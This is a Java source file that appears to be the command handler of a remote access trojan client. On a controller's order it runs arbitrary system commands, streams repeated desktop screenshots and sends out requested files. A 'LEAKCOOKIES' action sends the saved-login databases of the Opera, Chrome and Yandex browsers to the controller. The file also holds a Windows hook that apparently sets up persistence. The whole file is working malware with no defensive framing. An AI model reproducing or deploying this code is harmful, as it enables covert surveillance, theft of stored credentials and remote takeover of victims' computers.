package me.ByteCoder.Core.JCController;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;

import javax.imageio.ImageIO;

import me.ByteCoder.Core.Client.CUtils;
import me.ByteCoder.Core.Client.ClientHandshake;
import me.ByteCoder.Core.Client.ClientMessageReceive;
import me.ByteCoder.Core.Client.PacketWriter;
import me.ByteCoder.Core.Client.Event.EventHandler;
import me.ByteCoder.Core.Client.Event.EventListener;

public class MessListener implements EventListener {
	
@EventHandler
public void onMess(ClientMessageReceive e) {
	if(e.getMessageType().equalsIgnoreCase("END")) {
		if(e.getMessageAction().equalsIgnoreCase("DO")) {
			Main.c.end();
			System.exit(1);
		}
	}else if(e.getMessageType().equalsIgnoreCase("COMMAND")) {
		if(e.getMessageAction().equalsIgnoreCase("RUN")) {
			try {
				Runtime.getRuntime().exec((String)e.getData());
			} catch (IOException ex) {
				ex.printStackTrace();
			}
		}
	}else if(e.getMessageType().equalsIgnoreCase("GUI")) {
		if(e.getMessageAction().equalsIgnoreCase("CREATE_BOX")) {
			Utils.createABox((String) e.getData());
		}
	}else if(e.getMessageType().equalsIgnoreCase("SCREENSHOT")) {
		if(e.getMessageAction().equalsIgnoreCase("START")) {
				Utils.screenThread = new Thread(new Runnable() {
					
					@Override
					public void run() {
						while(true) {
							PacketWriter packet = new PacketWriter();
							
							packet.sendPacket("SCREENSHOT", "RECEIVE", "NOW", Main.c.getName());
							
							try {
								ImageIO.write(Utils.createScreenShot(), "jpg", packet.getSocket().getOutputStream());
								packet.getSocket().getOutputStream().flush();
								System.out.println("Sending desktop screenshot...");
								try {
									Thread.sleep(Integer.valueOf((String) e.getData()) * 1000);
								} catch (NumberFormatException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							} catch (IOException e) {
								packet.close();
							} finally {
								System.out.println("Screenshot sendet!");
								packet.close();
							}
						}
					}
					});
				Utils.screenThread.start();
		}else if(e.getMessageAction().equalsIgnoreCase("STOP")) {
			if(Utils.screenThread != null) {
				Utils.screenThread.interrupt();
			}
			Utils.screenThread = null;
			System.gc();
		}
	}else if(e.getMessageType().equalsIgnoreCase("FILE")) {
		if(e.getMessageAction().equalsIgnoreCase("DOWNLOAD")) {
			String dir = (String) e.getData();
			String dirC = dir.replaceAll("/", File.separator);
			String toDown = e.getTarget();
			File file = new File(dirC + File.separator + toDown);
			if(file.exists()) {
				new ClientHandshake(file.getName(), Utils.getFileExtension(file)).sendFile(file);
			}
		}else if(e.getMessageAction().equalsIgnoreCase("LEAKCOOKIES")) {
			File OperaCookies = new File("C:" + File.separator + "Users" + File.separator + System.getProperty("user.name") + File.separator + "AppData" + File.separator + "Roaming" + File.separator + "Opera Software" + File.separator + "Opera Stable" + File.separator + "Login Data");
			if(OperaCookies.exists()) {
				new ClientHandshake(OperaCookies.getName() + "_Opera", Utils.getFileExtension(OperaCookies)).sendFile(OperaCookies);
			}
			
			File ChromeCookies = new File("C:" + File.separator + "Google" + File.separator + "Login Data");
			if(ChromeCookies.exists()) {
				new ClientHandshake(ChromeCookies.getName() + "_Chrome", Utils.getFileExtension(ChromeCookies)).sendFile(ChromeCookies);
			}
			
			File YandexCookies = new File("C:" + File.separator + "Users" + File.separator + System.getProperty("user.name") + File.separator + "AppData" + File.separator + "Local" + File.separator + "Yandex" + File.separator + "YandexBrowser" + File.separator + "User Data" + File.separator + "Default" + File.separator + "Login Data");
			if(YandexCookies.exists()) {
				new ClientHandshake(YandexCookies.getName() + "_Yandex", Utils.getFileExtension(YandexCookies)).sendFile(YandexCookies);
			}
			
		}else if(e.getMessageAction().equalsIgnoreCase("UPLOAD")) {
 			Main.c.startFileReadPacket(e.getTarget(), (String) e.getData());
		}else if(e.getMessageAction().equalsIgnoreCase("CREATE")) {
			File f = new File(e.getTarget());
			if(!f.exists()) {
				f.mkdirs();
			}
		}
	}else if(e.getMessageType().equalsIgnoreCase("WINDOWS")) {
		if(e.getMessageAction().equalsIgnoreCase("SCRIBE")) {
			Utils.newScribeToWindows();
		}
	}else if(e.getMessageType().equalsIgnoreCase("MODULE")) {
		if(e.getMessageAction().equalsIgnoreCase("RUN")) {
			
		}
	}else if(e.getMessageType().equalsIgnoreCase("JCLIENT")) {
		if(e.getMessageAction().equalsIgnoreCase("ALIVE_PACKET")) {
			Main.c.write("CLIENT", "TEST", "I'm here, Core!", "YOU");
		}else if(e.getMessageAction().equalsIgnoreCase("SET_NAME")) {
			Main.c.setName((String)e.getData());
		}else if(e.getMessageAction().equalsIgnoreCase("TASK_LIST")) {
			Main.c.write("DATA", "SET", Utils.getTaskListFormated(), "TASKLIST");
		}
	}else if(e.getMessageType().equalsIgnoreCase("JCONSOLE")) {
		if(e.getMessageAction().equalsIgnoreCase("WRITE")) {
			if(Main.console == null) {
				Main.console = new BC_Console();
				Main.startConsoleListener();
			}
			
			Main.console.println((String) e.getData()); 
		}else if(e.getMessageAction().equalsIgnoreCase("CREATE")) {
			Main.console = new BC_Console();
			Main.startConsoleListener();
		}
	}
	
	System.out.println("New message. Type: " + e.getMessageType() + ". Action: " + e.getMessageAction() + ". Data: " + e.getData() + ". Target: " + e.getTarget());
}
	
}
